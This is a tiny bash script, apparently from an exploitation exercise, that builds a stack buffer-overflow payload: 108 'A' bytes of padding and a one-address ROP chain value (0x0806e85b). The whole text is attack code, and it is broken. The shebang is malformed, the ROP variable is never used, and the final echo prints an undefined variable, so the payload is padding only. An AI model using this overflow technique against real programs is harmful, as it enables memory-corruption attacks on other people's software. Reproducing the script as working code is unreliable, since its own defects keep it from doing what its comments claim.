#!bin/bash

buffer=$(printf '\x41%.0s' {1..108}) #fill the buffer

ropchain="\x5b\xe8\x06\x08"     #0x0806e85b


echo -en "$buffer$buffer2"